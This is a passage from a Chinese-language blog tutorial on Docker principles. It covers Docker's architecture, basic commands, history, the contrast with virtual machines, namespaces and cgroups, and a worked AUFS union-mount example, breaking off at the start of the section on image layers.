<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Docker原理（图解&#43;秒懂&#43;史上最全） - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Docker原理（图解&#43;秒懂&#43;史上最全）" />
<meta property="og:description" content="文章很长，建议收藏起来，慢慢读！ Java 高并发 发烧友社群：疯狂创客圈 奉上以下珍贵的学习资源：
免费赠送 经典图书:《Java高并发核心编程（卷1）》 面试必备 &#43; 大厂必备 &#43;涨薪必备 加尼恩免费领
免费赠送 经典图书:《Java高并发核心编程（卷2）》 面试必备 &#43; 大厂必备 &#43;涨薪必备 加尼恩免费领
免费赠送 经典图书:《Netty Zookeeper Redis 高并发实战》 面试必备 &#43; 大厂必备 &#43;涨薪必备 加尼恩免费领
免费赠送 经典图书:《SpringCloud Nginx高并发核心编程》 面试必备 &#43; 大厂必备 &#43;涨薪必备 加尼恩免费领
免费赠送 资源宝库： Java 必备 百度网盘资源大合集 价值&gt;10000元 加尼恩领取 推荐：入大厂 、做架构、大力提升Java 内功 的 精彩博文 入大厂 、做架构、大力提升Java 内功 必备的精彩博文2021 秋招涨薪1W &#43; 必备的精彩博文1：Redis 分布式锁 （图解-秒懂-史上最全）2：Zookeeper 分布式锁 （图解-秒懂-史上最全）3: Redis与MySQL双写一致性如何保证？ （面试必备）4: 面试必备：秒杀超卖 解决方案 （史上最全）5:面试必备之：Reactor模式6: 10分钟看懂， Java NIO 底层原理7:TCP/IP（图解&#43;秒懂&#43;史上最全）8：Feign原理 （图解）9:DNS图解（秒懂 &#43; 史上最全 &#43; 高薪必备）10：CDN图解（秒懂 &#43; 史上最全 &#43; 高薪必备）11: 分布式事务（ 图解 &#43; 史上最全 &#43; 吐血推荐 ）12：seata AT模式实战（图解&#43;秒懂&#43;史上最全）13：seata 源码解读（图解&#43;秒懂&#43;史上最全）14：seata TCC模式实战（图解&#43;秒懂&#43;史上最全） Java 面试题 30个专题 , 史上最全 , 面试必刷阿里、京东、美团… 随意挑、横着走！！！1： JVM面试题（史上最强、持续更新、吐血推荐）2：Java基础面试题（史上最全、持续更新、吐血推荐3：架构设计面试题 （史上最全、持续更新、吐血推荐）4：设计模式面试题 （史上最全、持续更新、吐血推荐）17、分布式事务面试题 （史上最全、持续更新、吐血推荐）一致性协议 （史上最全）29、多线程面试题（史上最全）30、HR面经，过五关斩六将后，小心阴沟翻船！9." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/f4d2eda8bf3ea74b60c060b6ce2e254b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-13T19:11:31+08:00" />
<meta property="article:modified_time" content="2021-10-13T19:11:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Docker原理（图解&#43;秒懂&#43;史上最全）</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>文章很长，建议收藏起来，慢慢读！ <a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>Java 高并发 发烧友社群：疯狂创客圈</strong></a> 奉上以下珍贵的学习资源：</p> 
<ul><li> <p><strong>免费赠送 经典图书:<a href="https://www.cnblogs.com/crazymakercircle/p/14493539.html" rel="nofollow">《Java高并发核心编程（卷1）》 </a> 面试必备 + 大厂必备 +涨薪必备</strong> 加尼恩免费领</p> </li><li> <p><strong>免费赠送 经典图书:<a href="https://www.cnblogs.com/crazymakercircle/p/14493539.html" rel="nofollow">《Java高并发核心编程（卷2）》 </a> 面试必备 + 大厂必备 +涨薪必备</strong> 加尼恩免费领</p> </li><li> <p><strong>免费赠送 经典图书:<a href="https://www.cnblogs.com/crazymakercircle/p/14493539.html" rel="nofollow">《Netty Zookeeper Redis 高并发实战》 </a> 面试必备 + 大厂必备 +涨薪必备</strong> 加尼恩免费领</p> </li><li> <p><strong>免费赠送 经典图书:<a href="https://www.cnblogs.com/crazymakercircle/p/14493539.html" rel="nofollow">《SpringCloud Nginx高并发核心编程》 </a> 面试必备 + 大厂必备 +涨薪必备</strong> 加尼恩免费领</p> </li><li> <p><strong>免费赠送 资源宝库： Java 必备 百度网盘资源大合集 价值&gt;10000元</strong> <a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow">加尼恩领取</a> </p> </li></ul> 
<hr> 
<h3><a id="_Java____11"></a>推荐：入大厂 、做架构、大力提升Java 内功 的 精彩博文</h3> 
<table><thead><tr><th align="left">入大厂 、做架构、大力提升Java 内功 必备的精彩博文</th><th>2021 秋招涨薪1W + 必备的精彩博文</th></tr></thead><tbody><tr><td align="left">1：<a href="https://www.cnblogs.com/crazymakercircle/p/14731826.html" rel="nofollow"><strong>Redis 分布式锁</strong> （图解-秒懂-史上最全）</a></td><td>2：<a href="https://www.cnblogs.com/crazymakercircle/p/14504520.html" rel="nofollow"><strong>Zookeeper 分布式锁</strong> （图解-秒懂-史上最全）</a></td></tr><tr><td align="left">3: <a href="https://www.cnblogs.com/crazymakercircle/p/14853622.html" rel="nofollow"><strong>Redis与MySQL双写一致性如何保证？</strong></a> （面试必备）</td><td>4: <a href="https://www.cnblogs.com/crazymakercircle/p/14846136.html" rel="nofollow"><strong>面试必备：秒杀超卖 解决方案</strong></a> （史上最全）</td></tr><tr><td align="left">5:<a href="https://www.cnblogs.com/crazymakercircle/p/9833847.html" rel="nofollow"><strong>面试必备之：Reactor模式</strong></a></td><td>6: <a href="https://www.cnblogs.com/crazymakercircle/p/10225159.html" rel="nofollow"><strong>10分钟看懂， Java NIO 底层原理</strong></a></td></tr><tr><td align="left">7:<a href="https://www.cnblogs.com/crazymakercircle/p/14499211.html" rel="nofollow"><strong>TCP/IP（图解+秒懂+史上最全）</strong></a></td><td>8：<a href="https://www.cnblogs.com/crazymakercircle/p/11965726.html" rel="nofollow">Feign原理 （图解）</a></td></tr><tr><td align="left">9:<a href="https://www.cnblogs.com/crazymakercircle/p/14976612.html" rel="nofollow">DNS图解（秒懂 + 史上最全 + 高薪必备）</a></td><td>10：<a href="https://www.cnblogs.com/crazymakercircle/p/14978513.html" rel="nofollow">CDN图解（秒懂 + 史上最全 + 高薪必备）</a></td></tr><tr><td align="left">11: <a href="https://www.cnblogs.com/crazymakercircle/p/13917517.html" rel="nofollow"><strong>分布式事务（ 图解 + 史上最全 + 吐血推荐 ）</strong></a></td><td>12：<a href="https://www.cnblogs.com/crazymakercircle/p/15313875.html" rel="nofollow">seata AT模式实战（图解+秒懂+史上最全）</a></td></tr><tr><td align="left">13：<a href="https://www.cnblogs.com/crazymakercircle/p/15313951.html" rel="nofollow">seata 源码解读（图解+秒懂+史上最全）</a></td><td>14：<a href="https://www.cnblogs.com/crazymakercircle/p/15314246.html" rel="nofollow">seata TCC模式实战（图解+秒懂+史上最全）</a></td></tr></tbody></table> 
<hr> 
<table><thead><tr><th align="left">Java 面试题 30个专题 , 史上最全 , 面试必刷</th><th>阿里、京东、美团… 随意挑、横着走！！！</th></tr></thead><tbody><tr><td align="left">1： <a href="https://www.cnblogs.com/crazymakercircle/p/14365820.html" rel="nofollow">JVM面试题（史上最强、持续更新、吐血推荐）</a></td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14366081.html" rel="nofollow">2：Java基础面试题（史上最全、持续更新、吐血推荐</a></td></tr><tr><td align="left"><a href="https://www.cnblogs.com/crazymakercircle/p/14367907.html" rel="nofollow">3：架构设计面试题 （史上最全、持续更新、吐血推荐）</a></td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14367101.html" rel="nofollow">4：设计模式面试题 （史上最全、持续更新、吐血推荐）</a></td></tr><tr><td align="left">17、<a href="https://www.cnblogs.com/crazymakercircle/p/14375424.html" rel="nofollow">分布式事务面试题 （史上最全、持续更新、吐血推荐）</a></td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14334422.html" rel="nofollow"><strong>一致性协议</strong> （史上最全）</a></td></tr><tr><td align="left">29、<a href="https://www.cnblogs.com/crazymakercircle/p/14655412.html" rel="nofollow"><strong>多线程面试题</strong>（史上最全）</a></td><td>30、<a href="https://www.cnblogs.com/crazymakercircle/p/14659738.html" rel="nofollow">HR面经，过五关斩六将后，小心阴沟翻船！</a></td></tr><tr><td align="left">9.<a href="https://www.cnblogs.com/crazymakercircle/p/14370335.html" rel="nofollow"><strong>网络协议面试题</strong>（史上最全、持续更新、吐血推荐）</a></td><td>更多专题， 请参见【<a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"> 疯狂创客圈 高并发 总目录</a> 】</td></tr></tbody></table> 
<hr> 
<table><thead><tr><th align="left">SpringCloud 精彩博文</th><th></th></tr></thead><tbody><tr><td align="left"><a href="https://www.cnblogs.com/crazymakercircle/p/14231815.html" rel="nofollow"> <strong>nacos 实战</strong>（史上最全）</a></td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14285001.html" rel="nofollow"> sentinel （史上最全+入门教程）</a></td></tr><tr><td align="left"><a href="https://www.cnblogs.com/crazymakercircle/p/11704077.html" rel="nofollow"> <strong>SpringCloud gateway</strong> （史上最全）</a></td><td>更多专题， 请参见【<a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"> 疯狂创客圈 高并发 总目录</a> 】</td></tr></tbody></table> 
<hr> 
<h3><a id="_42"></a>背景：</h3> 
<p>下一个视频版本，从架构师视角，尼恩为大家打造高可用、高并发中间件的原理与实操。</p> 
<p>目标：通过视频和博客的方式，为各位潜力架构师，彻底介绍清楚架构师必须掌握的高可用、高并发环境，包括但不限于：</p> 
<ul><li> <p>高可用、高并发nginx架构的原理与实操</p> </li><li> <p>高可用、高并发mysql架构的原理与实操</p> </li><li> <p>高可用、高并发nacos架构的原理与实操</p> </li><li> <p>高可用、高并发rocketmq架构的原理与实操</p> </li><li> <p>高可用、高并发es架构的原理与实操</p> </li><li> <p>高可用、高并发minio架构的原理与实操</p> </li></ul> 
<p><img src="https://images2.imgbox.com/ee/e6/WpnNVqWV_o.png" alt="在这里插入图片描述"></p> 
<p>why 高可用、高并发中间件的原理与实操：</p> 
<blockquote> 
 <ul><li> <p>实际的开发过程中，很多小伙伴聚焦crud开发，环境出了问题，都不能启动。</p> </li><li> <p>作为架构师，或者未来想走向高端开发，或者做架构，必须掌握高可用、高并发中间件的原理，掌握其实操。</p> </li></ul> 
</blockquote> 
<p>由于以上的高可用环境的原理和大家，使用docker和 docker-compose完成，包含 高可用mysql , 高可用 rocketmq ，等一系列的中间件。</p> 
<p>另外，在高级程序员和架构师的招聘中， docker的原理，也是必须掌握的基础内容。</p> 
<p>所以，给大家介绍一下docker原理。</p> 
<p>本系列博客的具体内容，请参见 <a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>Java 高并发 发烧友社群：疯狂创客圈</strong></a></p> 
<h3><a id="Docker_81"></a>Docker基础</h3> 
<p>作为大神或者准架构师/架构师，一定要了解一下docker的底层原理。</p> 
<p>但是，首先还是简单说明一下docker的简介。</p> 
<h4><a id="Docker__87"></a>Docker 简介</h4> 
<p><img src="https://images2.imgbox.com/70/24/pxQ8s2Vx_o.png" alt="img"></p> 
<p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html" rel="nofollow">Go 语言</a> 并遵从 Apache2.0 协议开源。</p> 
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p> 
<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p> 
<p>Docker 从 17.03 版本之后分为 CE（Community Edition: 社区版） 和 EE（Enterprise Edition: 企业版），我们用社区版就可以了</p> 
<h4><a id="Docker_101"></a>Docker的应用场景</h4> 
<ul><li>Web 应用的自动化打包和发布。</li><li>自动化测试和持续集成、发布。</li><li>在服务型环境中部署和调整数据库或其他的后台应用。</li><li>从头编译或者扩展现有的 OpenShift 或 Cloud Foundry 平台来搭建自己的 PaaS 环境。</li></ul> 
<h4><a id="Docker__110"></a>Docker 架构</h4> 
<p>Docker 包括三个基本概念:</p> 
<ul><li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li><li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li><li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li></ul> 
<p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p> 
<p>Docker 容器通过 Docker 镜像来创建。</p> 
<table><thead><tr><th align="left">概念</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">Docker 镜像(Images)</td><td align="left">Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。</td></tr><tr><td align="left">Docker 容器(Container)</td><td align="left">容器是独立运行的一个或一组应用，是镜像运行时的实体。</td></tr><tr><td align="left">Docker 客户端(Client)</td><td align="left">Docker 客户端通过命令行或者其他工具使用 Docker SDK (https://docs.docker.com/develop/sdk/) 与 Docker 的守护进程通信。</td></tr><tr><td align="left">Docker 主机(Host)</td><td align="left">一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</td></tr><tr><td align="left">Docker Registry</td><td align="left">Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(<a href="https://hub.docker.com/" rel="nofollow">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;</strong> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <strong>latest</strong> 作为默认标签。</td></tr></tbody></table> 
<h4><a id="_134"></a>最为常用的几个命令</h4> 
<h5><a id="docker_138"></a>docker的守护进程查看</h5> 
<p>systemctl status docker</p> 
<h5><a id="docker__146"></a>docker 镜像查看</h5> 
<p>docker image ls</p> 
<h5><a id="docker__154"></a>docker 容器查看</h5> 
<p>docker ps</p> 
<h5><a id="Docker_Registry_162"></a>Docker Registry配置和查看</h5> 
<p>cat /etc/docker/daemon.json</p> 
<pre><code>配置私有仓库

cat&gt;/etc/docker/daemon.json&lt;&lt;EOF

{

  "registry-mirrors":["http://10.24.2.30:5000","https://tnxkcso1.mirrors.aliyuncs.com"],

  "insecure-registries":["10.24.2.30:5000"]

}

EOF

</code></pre> 
<h3><a id="Docker__191"></a>Docker 的发展历史</h3> 
<p>Docker 公司前身是 DotCloud，由 Solomon Hykes 在2010年成立，2013年更名 Docker。同年发布了 Docker-compose 组件提供容器的编排工具。</p> 
<p>2014年 Docker 发布1.0版本，2015年Docker 提供 Docker-machine，支持 windows 平台。</p> 
<p>在此期间，Docker 项目在开源社区大受追捧，同时也被业界诟病的是 Docker 公司对于 Docker 发展具有绝对的话语权，比如 Docker 公司推行了 libcontainer 难以被社区接受。</p> 
<p>为了防止 Docker 这项开源技术被Docker 公司控制，在几个核心贡献的厂商，于是在一同贡献 Docker 代码的公司诸如 Redhat，谷歌的倡导下，成立了 OCI 开源社区。</p> 
<p>OCI 开源社区旨在于将 Docker 的发展权利回归社区，当然反过来讲，Docker 公司也希望更多的厂商安心贡献代码到Docker 项目，促进 Docker 项目的发展。</p> 
<p>于是通过OCI建立了 runc 项目，替代 libcontainer，这为开发者提供了除 Docker 之外的容器化实现的选择。</p> 
<p>OCI 社区提供了 runc 的维护，而 runc 是基于 OCI 规范的运行容器的工具。换句话说，你可以通过 runc，提供自己的容器实现，而不需要依赖 Docker。当然，Docker 的发行版底层也是用的 runc。在 Docker 宿主机上执行 runc，你会发现它的大多数命令和 Docker 命令类似，感兴趣的读者可以自己实践如何用 runc 启动容器。</p> 
<p>至2017年，Docker 项目转移到 Moby 项目，基于 Moby 项目，Docker 提供了两种发行版，Docker CE 和 Docker EE， Docker CE 就是目前大家普遍使用的版本，Docker EE 成为付费版本，提供了容器的编排，Service 等概念。Docker 公司承诺 Docker 的发行版会基于 Moby 项目。这样一来，通过 Moby 项目，你也可以自己打造一个定制化的容器引擎，而不会被 Docker 公司绑定。</p> 
<h3><a id="Docker__217"></a>Docker 与虚拟机有何区别</h3> 
<blockquote> 
 <p>Docker 的误解：Docker 是轻量级的虚拟机。</p> 
</blockquote> 
<p>很多人将docker理解为， Docker 实现了类似于虚拟化的技术，能够让应用跑在一些轻量级的容器里。这么理解其实是错误的。</p> 
<h4><a id="docker_227"></a>到底什么是docker：</h4> 
<p>Docker是一个Client-Server结构的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问Docker守护进程。</p> 
<p>Docker守护进程从客户端接受命令，并按照命令，管理运行在主机上的容器。</p> 
<p><strong>一个docker 容器，是一个运行时环境，可以简单理解为进程运行的集装箱。</strong></p> 
<p>如图下所示</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-BJxVMqCV-1634115620027)(https://www.pianshen.com/images/164/48df69f7ee8406a97c5852b9b9ec4abc.png)]</p> 
<h4><a id="dockerkvm_241"></a>docker和kvm都是虚拟化技术，它们的主要差别：</h4> 
<p>1、Docker有着比虚拟机更少的抽象层</p> 
<p>2、docker利用的是宿主机的内核，VM需要的是Guest OS</p> 
<p><img src="https://images2.imgbox.com/21/f2/0AqKbpZl_o.png" alt="img"></p> 
<p>二者的不同：</p> 
<ul><li>VM(VMware)在宿主机器、宿主机器操作系统的基础上创建虚拟层、虚拟化的操作系统、虚拟化的仓库，然后再安装应用；</li><li>Container(Docker容器)，在宿主机器、宿主机器操作系统上创建Docker引擎，在引擎的基础上再安装应用。</li></ul> 
<p>所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统，避免引导。docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！</p> 
<p>虚拟机是加载Guest OS ，这是分钟级别的</p> 
<h4><a id="VM_266"></a>与传统VM特性对比：</h4> 
<p>作为一种轻量级的虚拟化方式，Docker在运行应用上跟传统的虚拟机方式相比具有显著优势：</p> 
<ul><li>Docker 容器很快，启动和停止可以在秒级实现，这相比传统的虚拟机方式要快得多。</li><li>Docker 容器对系统资源需求很少，一台主机上可以同时运行数千个Docker容器。</li><li>Docker 通过类似Git的操作来方便用户获取、分发和更新应用镜像，指令简明，学习成本较低。</li><li>Docker 通过Dockerfile配置文件来支持灵活的自动化创建和部署机制，提高工作效率。</li><li>Docker 容器除了运行其中的应用之外，基本不消耗额外的系统资源，保证应用性能的同时，尽量减小系统开销。</li><li>Docker 利用Linux系统上的多种防护机制实现了严格可靠的隔离。从1.3版本开始，Docker引入了安全选项和镜像签名机制，极大地提高了使用Docker的安全性。</li></ul> 
<table><thead><tr><th align="left">特性</th><th align="left">容器</th><th align="left">虚拟机</th></tr></thead><tbody><tr><td align="left">启动速度</td><td align="left">秒级</td><td align="left">分钟级</td></tr><tr><td align="left">硬盘使用</td><td align="left">一般为MB</td><td align="left">一般为GB</td></tr><tr><td align="left">性能</td><td align="left">接近原生</td><td align="left">弱于原生</td></tr><tr><td align="left">系统支持量</td><td align="left">单机支持上千个容器</td><td align="left">一般几十个</td></tr></tbody></table> 
<h3><a id="Docker_288"></a>Docker的技术底座：</h3> 
<p>Linux 命名空间、控制组和 UnionFS 三大技术支撑了目前 Docker 的实现，也是 Docker 能够出现的最重要原因。</p> 
<p><img src="https://images2.imgbox.com/6c/0f/xYj8dCG2_o.png" alt="在这里插入图片描述"></p> 
<ul><li>namespace，命名空间</li></ul> 
<p>命名空间，容器隔离的基础，保证A容器看不到B容器.<br> 6个命名空间：User，Mnt，Network，UTS，IPC，Pid</p> 
<ul><li>cgroups，Cgroups 是 Control Group 的缩写，控制组</li></ul> 
<p>cgroups 容器资源统计和隔离</p> 
<p>主要用到的cgroups子系统：cpu，blkio，device，freezer，memory</p> 
<p>实际上 Docker 是使用了很多 Linux 的隔离功能，让容器看起来像一个轻量级虚拟机在独立运行，容器的本质是被限制了的 Namespaces，cgroup，具有逻辑上独立文件系统，网络的一个进程。</p> 
<ul><li>unionfs 联合文件系统</li></ul> 
<p>典型：aufs/overlayfs，分层镜像实现的基础</p> 
<h3><a id="UnionFS___327"></a>UnionFS 联合文件系统</h3> 
<h4><a id="_331"></a>什么是镜像</h4> 
<p>那么问题来了，没有操作系统，怎么运行程序？</p> 
<p>可以在Docker中创建一个centos的镜像文件，这样就能将centos系统集成到Docker中，运行的应用就都是centos的应用。</p> 
<p>Image 是 Docker 部署的基本单位，一个 Image 包含了我们的程序文件，以及这个程序依赖的资源的环境。Docker Image 对外是以一个文件的形式展示的（更准确的说是一个 mount 点）。</p> 
<h4><a id="UnionFS_AUFS_341"></a>UnionFS 与AUFS</h4> 
<p>UnionFS 其实是一种为 Linux 操作系统设计的用于把多个文件系统『联合』到同一个挂载点的文件系统服务。</p> 
<p>AUFS 即 Advanced UnionFS 其实就是 UnionFS 的升级版，它能够提供更优秀的性能和效率。</p> 
<p>AUFS 作为先进联合文件系统，它能够将不同文件夹中的层联合（Union）到了同一个文件夹中，这些文件夹在 AUFS 中称作分支，整个『联合』的过程被称为联合挂载（Union Mount）。</p> 
<p>概念理解起来比较枯燥，最好是有一个真实的例子来帮助我们理解：</p> 
<p>首先，我们建立 company 和 home 两个目录，并且分别为他们创造两个文件</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">tree</span> <span class="token expression"><span class="token punctuation">.</span></span></span>
<span class="token punctuation">.</span>
<span class="token operator">|</span><span class="token operator">--</span> company
<span class="token operator">|</span>   <span class="token operator">|</span><span class="token operator">--</span> code
<span class="token operator">|</span>   `<span class="token operator">--</span> meeting
`<span class="token operator">--</span> home
    <span class="token operator">|</span><span class="token operator">--</span> eat
    `<span class="token operator">--</span> sleep
</code></pre> 
<p>然后我们将通过 mount 命令把 company 和 home 两个目录「联合」起来，建立一个 AUFS 的文件系统，并挂载到当前目录下的 mnt 目录下：</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">mkdir</span> <span class="token expression">mnt</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ll</span></span>
total <span class="token number">20</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">5</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">10</span> <span class="token punctuation">.</span><span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">5</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">06</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">4</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">06</span> company<span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">4</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">05</span> home<span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">2</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">10</span> mnt<span class="token operator">/</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">mount</span> <span class="token expression"><span class="token operator">-</span>t aufs <span class="token operator">-</span>o dirs<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>home<span class="token operator">:</span><span class="token punctuation">.</span><span class="token operator">/</span>company none <span class="token punctuation">.</span><span class="token operator">/</span>mnt</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ll</span></span>
total <span class="token number">20</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">5</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">10</span> <span class="token punctuation">.</span><span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">5</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">06</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">4</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">06</span> company<span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">6</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">10</span> home<span class="token operator">/</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x <span class="token number">8</span> root root <span class="token number">4096</span> Oct <span class="token number">25</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">10</span> mnt<span class="token operator">/</span>
root@rds<span class="token operator">-</span>k8s<span class="token operator">-</span><span class="token number">18</span><span class="token operator">-</span>svr0<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>xuran<span class="token operator">/</span>aufs# tree <span class="token punctuation">.</span><span class="token operator">/</span>mnt<span class="token operator">/</span>
<span class="token punctuation">.</span><span class="token operator">/</span>mnt<span class="token operator">/</span>
<span class="token operator">|</span><span class="token operator">--</span> code
<span class="token operator">|</span><span class="token operator">--</span> eat
<span class="token operator">|</span><span class="token operator">--</span> meeting
`<span class="token operator">--</span> sleep

<span class="token number">4</span> directories<span class="token punctuation">,</span> <span class="token number">0</span> files
</code></pre> 
<p>通过 ./mnt 目录结构的输出结果，可以看到原来两个目录下的内容都被合并到了一个 mnt 的目录下。</p> 
<p>默认情况下，如果我们不对「联合」的目录指定权限，内核将根据从左至右的顺序将第一个目录指定为可读可写的，其余的都为只读。那么，当我们向只读的目录做一些写入操作的话，会发生什么呢？</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">echo</span> <span class="token expression">apple <span class="token operator">&gt;</span> <span class="token punctuation">.</span><span class="token operator">/</span>mnt<span class="token operator">/</span>code</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">cat</span> <span class="token expression">company<span class="token operator">/</span>code</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">cat</span> <span class="token expression">home<span class="token operator">/</span>code</span></span>
apple

</code></pre> 
<p>通过对上面代码段的观察，我们可以看出，当写入操作发生在 company/code 文件时， 对应的修改并没有反映到原始的目录中。</p> 
<p>而是在 home 目录下又创建了一个名为 code 的文件，并将 apple 写入了进去。</p> 
<p>看起来很奇怪的现象，其实这正是 Union File System 的厉害之处：</p> 
<blockquote> 
 <p>Union File System 联合了多个不同的目录，并且把他们挂载到一个统一的目录上。</p> 
</blockquote> 
<p>在这些「联合」的子目录中， 有一部分是可读可写的，但是有一部分只是可读的。</p> 
<blockquote> 
 <p>当你对可读的目录内容做出修改的时候，其结果只会保存到可写的目录下，不会影响只读的目录。</p> 
</blockquote> 
<p>比如，我们可以把我们的服务的源代码目录和一个存放代码修改记录的目录「联合」起来构成一个 AUFS。前者设置只读权限，后者设置读写权限。</p> 
<p>那么，一切对源代码目录下文件的修改都只会影响那个存放修改的目录，不会污染原始的代码。</p> 
<p>在 AUFS 中还有一个特殊的概念需要提及一下：</p> 
<p>branch – 就是各个要被union起来的目录。</p> 
<p>Stack 结构 - AUFS 它会根据branch 被 Union 的顺序形成一个 Stack 的结构，从下至上，最上面的目录是可读写的，其余都是可读的。如果按照我们刚刚执行 aufs 挂载的命令来说，最左侧的目录就对应 Stack 最顶层的 branch。</p> 
<p>所以：下面的命令中，最为左侧的为 home，而不是 company</p> 
<pre><code>mount -t aufs -o dirs=./home:./company none ./mnt
</code></pre> 
<h4><a id="_Docker__440"></a>什么是 Docker 镜像分层机制？</h4> 
<p>首先，让我们来看下 Docker Image 中的 Layer 的概念：</p> 
